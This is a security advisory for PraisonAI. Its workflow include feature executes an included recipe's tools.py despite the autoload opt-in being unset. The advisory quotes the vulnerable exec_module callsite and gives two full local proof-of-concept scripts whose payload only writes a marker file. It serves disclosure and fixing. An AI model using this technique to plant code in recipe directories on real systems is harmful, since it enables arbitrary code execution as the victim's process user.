# [H] PraisonAI workflow include bypasses tools.py autoload opt-in and executes included recipe code

## Summary
Severity: High
Advisory: GHSA-hxmv-c4g6-5fqc
CVE: CVE-2026-55522
CWE: CWE-94, CWE-426, CWE-829
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-hxmv-c4g6-5fqc
Type: github-advisory

## Affected
- PyPI: `praisonaiagents` — affected >=0.12.12 <1.6.58
- PyPI: `PraisonAI` — affected >=3.9.26 <4.6.58

## Details
## Summary

PraisonAI's workflow include implementation implicitly imports and executes an included recipe's `tools.py` file even when the documented `tools.py` autoload opt-in is unset.

This bypasses the hardening added for the prior automatic `tools.py` RCE advisory family. A workflow that includes an untrusted local recipe can execute arbitrary Python module-level code before any model call or child workflow execution.

The same sink is reachable through the higher-level `praisonai.recipe.run()` recipe API when a steps-based recipe workflow includes a local child recipe. The supplementary PoV demonstrates this route without starting a network service or relying on external APIs.

This is distinct from the previously published `tool_resolver.py`, `api/call.py`, `templates/tool_override.py`, and `agents_generator.py` variants. The affected callsite is the workflow include implementation in `praisonaiagents`, reached through the documented/covered `Include` workflow composition feature.

## Affected Components

- Package: `praisonaiagents`
- File: `praisonaiagents/workflows/workflows.py`
- Sink: `Workflow._execute_include()`
- Current affected callsite:

```python
tools_py = recipe_path / "tools.py"
if tools_py.exists():
    spec = importlib.util.spec_from_file_location("recipe_tools", tools_py)
    recipe_module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(recipe_module)
```

The current head also contains a similar unguarded workflow-local `tools.py` import in `_resolve_pydantic_class()`. That adjacent sink is not needed for the primary impact claim because the include path has a cleaner public workflow execution path and local PoV.

## Security Boundary

PraisonAI documents secure defaults for implicit `tools.py` autoload:

- `PRAISONAI_ALLOW_TEMPLATE_TOOLS` controls implicit template/CWD `tools.py` autoload and is disabled by default.
- `PRAISONAI_ALLOW_LOCAL_TOOLS` controls automatic loading of local `tools.py` files and requires the value `true`.
- Explicit override files/directories are the recommended way to load custom tools without the implicit autoload opt-in.
- Existing regression tests for `GHSA-xcmw-grxf-wjhj` assert that template/CWD `tools.py` must not execute by default.

`Workflow._execute_include()` does not check `PRAISONAI_ALLOW_TEMPLATE_TOOLS`, does not check `PRAISONAI_ALLOW_LOCAL_TOOLS`, and does not route through the shared safe loader before executing the included recipe's `tools.py`.

The report is not claiming that workflow includes themselves are unintended. Local tests in the repository cover `Include`, `include()`, YAML include parsing, and include-in-loop behavior. The security issue is specifically that the include implementation executes the included recipe's `tools.py` unconditionally instead of respecting the same implicit-tool-loading gates used elsewhere.

The report also is not claiming that recipe `tools.py` files are inherently unsafe or unsupported. Official recipe documentation describes `tools.py` as the place for custom functions and dynamic variables. The issue is the implicit execution mode: official tool-override documentation says implicit `tools.py` autoload from CWD or template directories is disabled by default, with explicit override files/directories recommended for new projects.

## Impact

An attacker who can cause a victim process to run a workflow that includes an attacker-controlled local recipe directory can execute arbitrary Python code as the PraisonAI process user.

The payload runs during include setup, before child workflow parsing or any LLM/model call. The PoV only writes a local marker file.

## Reproduction

Run the attached local-only PoV:

```bash
python3 pov.py
```

Expected vulnerable output:

```text
VULNERABLE: included recipe tools.py executed with PRAISONAI_ALLOW_LOCAL_TOOLS and PRAISONAI_ALLOW_TEMPLATE_TOOLS unset
marker=...
marker_content=executed
```

The PoV:

1. Unsets `PRAISONAI_ALLOW_LOCAL_TOOLS` and `PRAISONAI_ALLOW_TEMPLATE_TOOLS`.
2. Creates a temporary `child_recipe/tools.py` with a marker-write payload.
3. Creates a minimal `child_recipe/workflow.yaml`.
4. Runs `Workflow(steps=[include("child_recipe")]).run(...)`.
5. Confirms the marker file was written before any model-backed workflow step is needed.

Supplementary higher-level API check:

```bash
python3 pov_recipe_run.py
```

Expected vulnerable output:

```text
VULNERABLE: praisonai.recipe.run() reached workflow include tools.py execution with PRAISONAI_ALLOW_LOCAL_TOOLS and PRAISONAI_ALLOW_TEMPLATE_TOOLS unset
recipe_status=success
recipe_ok=True
marker=...
marker_content=executed
```

## Validation

Tested vulnerable:

- Current head: `bcb6957dac1bc8949866522948a9f61d7e4bd4c1`
- Latest release tag: `v4.6.56` (`praisonai==4.6.56`, `praisonaiagents==1.6.56`)
- Older affected tag: `v3.9.26` (`praisonai==3.9.26`, `praisonaiagents==0.12.12`)

Negative/control observations:

- `v3.9.24` does not expose the same `include` helper/API used by this PoV.
- The hardened `praisonai.templates.tool_override.create_tool_registry_with_overrides(..., template_dir=...)` path does not execute `tools.py` when `PRAISONAI_ALLOW_TEMPLATE_TOOLS` is unset.
- Existing regression test `src/praisonai/tests/unit/templates/test_tool_override_autoload_gate.py` states that implicit recipe/template `tools.py` autoload should be gated behind `PRAISONAI_ALLOW_TEMPLATE_TOOLS`.
- Include is a first-class workflow feature, not an accidental private method: repository tests cover `include()` imports, YAML include parsing, direct `Workflow._execute_include` presence, and include steps inside loops.
- `praisonai.recipe.run()` also reaches the sink through steps-based recipe workflow execution. This strengthens API reachability but does not change the base severity claim to Critical because a clean unauthenticated remote route for this exact include sink was not validated.

## Root Cause

The include implementation reintroduced a direct `importlib.util.spec_from_file_location()` plus `spec.loader.exec_module()` path outside the centralized safe loader and template override gate. Prior fixes hardened several `tools.py` autoload chokepoints, but this workflow include sibling callsite still executes module-level code unconditionally.

## Suggested Fix

Route included-recipe tool loading through the same security policy used by the template tool override system.

Conservative options:

1. Do not implicitly load included recipe `tools.py` by default.
2. Only load it when `PRAISONAI_ALLOW_TEMPLATE_TOOLS` is explicitly truthy.
3. Prefer explicit `tools_sources`, `override_files`, or a caller-supplied registry for custom tools.
4. Add regression coverage for `Workflow(steps=[include("...")])` proving included recipe `tools.py` does not execute with the opt-in unset.
5. Consider using AST-based discovery for names where possible, and delay execution until an explicitly configured tool is invoked under the appropriate policy.

If local workflow includes are intended to use `PRAISONAI_ALLOW_LOCAL_TOOLS` instead, the same principle applies: the include sink should call a shared helper and should not perform raw `exec_module()` directly.

## Severity

Rationale: exploitation requires causing a victim/local process to process an attacker-controlled workflow/include or recipe directory, but no privileges are required once the workflow is run, attack complexity is low, and successful exploitation gives arbitrary Python code execution in the PraisonAI process.

Critical/network severity is not claimed for the base report because a clean unauthenticated remote path for this exact include sink on current head was not validated.


## Appendix A - pov.py

```python
#!/usr/bin/env python3
"""Local PoV for PraisonAI workflow include tools.py autoload.

This PoV uses only local files and the public workflow API. It verifies whether
a workflow-local include executes the included recipe's tools.py even when the
PRAISONAI_ALLOW_LOCAL_TOOLS opt-in is unset.
"""

from __future__ import annotations

import os
import shutil
import sys
import tempfile
from pathlib import Path


MARKER_NAME = "prai_workflow_include_tools_autoload_marker.txt"


def _find_default_repo() -> Path:
    for parent in Path(__file__).resolve().parents:
        candidate = parent / "artifacts" / "repos" / "praisonai-current"
        if candidate.exists():
            return candidate
    raise RuntimeError("Could not locate artifacts/repos/praisonai-current")


def main() -> int:
    repo = Path(os.environ.get("PRAISONAI_POV_REPO", str(_find_default_repo()))).resolve()
    sys.path.insert(0, str(repo / "src" / "praisonai-agents"))
    sys.path.insert(0, str(repo / "src" / "praisonai"))

    os.environ.pop("PRAISONAI_ALLOW_LOCAL_TOOLS", None)
    os.environ.pop("PRAISONAI_ALLOW_TEMPLATE_TOOLS", None)

    workdir = Path(tempfile.mkdtemp(prefix="prai-include-autoload-"))
    old_cwd = Path.cwd()
    try:
        recipe = workdir / "child_recipe"
        recipe.mkdir()
        marker = workdir / MARKER_NAME

        (recipe / "tools.py").write_text(
            "from pathlib import Path\n"
            f"Path({str(marker)!r}).write_text('executed')\n"
            "def benign_tool():\n"
            "    return 'ok'\n",
            encoding="utf-8",
        )
        (recipe / "workflow.yaml").write_text(
            "name: child\n"
            "steps: []\n",
            encoding="utf-8",
        )

        os.chdir(workdir)

        from praisonaiagents.workflows.workflows import Workflow, include

        workflow = Workflow(steps=[include("child_recipe")])
        workflow.run(input="", llm="dummy/local", stream=False)

        if marker.exists():
            print(
                "VULNERABLE: included recipe tools.py executed with "
                "PRAISONAI_ALLOW_LOCAL_TOOLS and PRAISONAI_ALLOW_TEMPLATE_TOOLS unset"
            )
            print(f"marker={marker}")
            print(f"marker_content={marker.read_text(encoding='utf-8')}")
            return 0

        print("NOT VULNERABLE: included recipe tools.py did not execute")
        return 1
    finally:
        os.chdir(old_cwd)
        shutil.rmtree(workdir, ignore_errors=True)


if __name__ == "__main__":
    raise SystemExit(main())

```

## Appendix B - pov_recipe_run.py

```python
#!/usr/bin/env python3
"""Supplementary local PoV through praisonai.recipe.run().

This exercises the higher-level recipe API. It does not start a network server
or rely on any external service. The payload writes a local marker file only.
"""

from __future__ import annotations

import os
import shutil
import sys
import tempfile
from pathlib import Path


MARKER_NAME = "prai_recipe_run_include_tools_autoload_marker.txt"


def _find_default_repo() -> Path:
    for parent in Path(__file__).resolve().parents:
        candidate = parent / "artifacts" / "repos" / "praisonai-current"
        if candidate.exists():
            return candidate
    raise RuntimeError("Could not locate artifacts/repos/praisonai-current")


def main() -> int:
    repo = Path(os.environ.get("PRAISONAI_POV_REPO", str(_find_default_repo()))).resolve()
    sys.path.insert(0, str(repo / "src" / "praisonai-agents"))
    sys.path.insert(0, str(repo / "src" / "praisonai"))

    os.environ.pop("PRAISONAI_ALLOW_LOCAL_TOOLS", None)
    os.environ.pop("PRAISONAI_ALLOW_TEMPLATE_TOOLS", None)

    workdir = Path(tempfile.mkdtemp(prefix="prai-recipe-include-autoload-"))
    old_cwd = Path.cwd()
    try:
        parent_recipe = workdir / "parent_recipe"
        child_recipe = workdir / "child_recipe"
        parent_recipe.mkdir()
        child_recipe.mkdir()
        marker = workdir / MARKER_NAME

        (parent_recipe / "TEMPLATE.yaml").write_text(
            "name: parent_recipe\n"
            "version: 1.0.0\n"
            "workflow: workflow.yaml\n",
            encoding="utf-8",
        )
        (parent_recipe / "workflow.yaml").write_text(
            "name: parent\n"
            "steps:\n"
            "  - include: child_recipe\n",
            encoding="utf-8",
        )
        (child_recipe / "workflow.yaml").write_text(
            "name: child\n"
            "steps: []\n",
            encoding="utf-8",
        )
        (child_recipe / "tools.py").write_text(
            "from pathlib import Path\n"
            f"Path({str(marker)!r}).write_text('executed')\n"
            "def benign_tool():\n"
            "    return 'ok'\n",
            encoding="utf-8",
        )

        os.chdir(workdir)

        from praisonai import recipe

        result = recipe.run(str(parent_recipe), input={}, options={"force": True})

        if marker.exists():
            print(
                "VULNERABLE: praisonai.recipe.run() reached workflow include "
                "tools.py execution with PRAISONAI_ALLOW_LOCAL_TOOLS and "
                "PRAISONAI_ALLOW_TEMPLATE_TOOLS unset"
            )
            print(f"recipe_status={result.status}")
            print(f"recipe_ok={result.ok}")
            print(f"marker={marker}")
            print(f"marker_content={marker.read_text(encoding='utf-8')}")
            return 0

        print("NOT VULNERABLE: recipe.run() did not execute included recipe tools.py")
        print(f"recipe_status={result.status}")
        print(f"recipe_error={result.error}")
        return 1
    finally:
        os.chdir(old_cwd)
        shutil.rmtree(workdir, ignore_errors=True)


if __name__ == "__main__":
    raise SystemExit(main())

```

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-hxmv-c4g6-5fqc
- https://nvd.nist.gov/vuln/detail/CVE-2026-55522
- https://github.com/MervinPraison/PraisonAI/commit/2f9677abb2ea68eab864ee8b6a828fd0141612e1
- https://github.com/MervinPraison/PraisonAI
- https://github.com/MervinPraison/PraisonAI/releases/tag/v4.6.58
